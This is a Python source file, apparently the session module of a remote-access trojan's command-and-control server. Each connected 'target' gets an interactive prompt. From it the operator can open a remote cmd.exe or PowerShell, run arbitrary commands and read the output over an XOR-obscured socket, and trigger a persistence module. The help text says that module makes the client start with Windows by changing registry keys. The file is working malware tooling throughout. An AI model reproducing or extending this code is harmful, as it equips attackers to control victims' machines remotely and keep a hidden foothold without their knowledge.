#from colorama import Fore,Style

#from . import menu
#from  .other import recvall
#from .other import printColor
#from .management import CheckConn
#from .handler import Handler

from colorama import Fore,Style

from .other import printColor
from .other import XOREncryption
from .management import CheckConn
from .handler import Handler
from .sql import Sql
from .spawnshell import FakeCmd
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT

import threading
import platform 

if(platform.system() == "Linux"):
    import readline
else: #if windows
    import pyreadline

class Session:
    #This class is called when the target is selected.
   # sesssion = True
    def __init__(self,socket,ip_client,port_client,session_nb):
        self.socket = socket
        self.ip_client = ip_client
        self.port_client = port_client 
        self.session_nb = session_nb

        
       
    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

--command : Start a command prompt (cmd.exe) on the remote machine.

--powershell : Start the powershell on the remote machine.

-c : Executes a command and returns the result.(Don't forget to put the command in double quotes). 

-p or --persistence : Makes the client persistent at startup by changing the registry keys.

-b or --back : Back to menu.
""") 

    def executeCommand(self,cmd_list):
        '''-c'''
       # print("-->",cmd_list)
        print("\n")
        cmd_list.pop(0) #delete "-c"
        
        tmp_cmd = " ".join(cmd_list) #list to string
        cmd = ""

        for char in tmp_cmd: #remove " 
            if(char == "\""):
                #print("char detect: ",char)
                pass
            elif(char == " "): #if space
               # print("space")
                cmd += " "
            else:
                cmd += char
       
        if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
        
            CheckConn().recvcommand(self.socket,4096) #XOR  The decryption of xor is automatic on this method.
            
        else:
            printColor("error","\n[-] An error occurred while sending the command.\n")
        

    def spawnShell(self,prog):
        '''--command or --powershell'''

        #Opens a shell on the remote machine. 
        printColor("information","\n[?] Execute -b or --back or exit to return to sessions mode.\n\n") 
        
        if(CheckConn().sendsafe(self.session_nb, self.socket, "MOD_SPAWN_SHELL:"+prog) ):
            FakeCmd(self.socket).main() #Run cmd
        
        else:
            printColor("error","\n[-] An error occurred while sending the command.\n")


    def lonelyPersistence(self):
        '''-p or --persistence'''
        #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
        mod_persi = "MOD_LONELY_PERSISTENCE:default"
        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi)): #send mod persi
            #printColor("information","[+] the persistence mod was sent.\n")
            
            reponse = CheckConn().recvsafe(self.socket,4096)
            if(reponse == "\r\n"):#Mod persi ok  
                printColor("successfully","\n[+] the persistence mod is well executed with success..\n")
            else:
                printColor("error","[-] the persistence mod could not be executed on the client.")

        else:
            printColor("information","[+] the persistence mod was not sent.\n")


    def printInformation(self):
        pass


    def main(self): #Main function of the class | tpl = tuple session_nb = session number
        
        printColor("help","\n[?] Run -h or --help to list the available commands.\n")
        #while Handler.dict_conn[self.session_nb][3]: #If connexion is always connected (True)
        checker = True
        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True)
            terminal = str(input(str(self.ip_client)+">")).split()
            for i in range(0,len(terminal)):   
                try:
                    if terminal[i] == "-h" or terminal[i] == "--help":
                        self.help()

                    elif terminal[i] == "--command":
                        self.spawnShell("cmd.exe")
                
                    elif  terminal[i] == "--powershell":
                        self.spawnShell("powershell.exe")
                    
                    elif terminal[i] == "-c":
                        self.executeCommand(terminal)

                    elif terminal[i] == "-b" or terminal[i] == "--back":
                        printColor("information","[-] Session stop.\n")
                        checker = False
                    elif terminal[i] == "-p" or terminal[i] == "--persistence":
                        self.lonelyPersistence()
                    else:
                        pass
                        print(i)
                except IndexError:
                    pass
                    #print("CHHHED")
                    #print(i)
                
        printColor("information","[-] The session was cut, back to menu.") #If the session close.
        printColor("information","[-] Back to the server menu.\n")
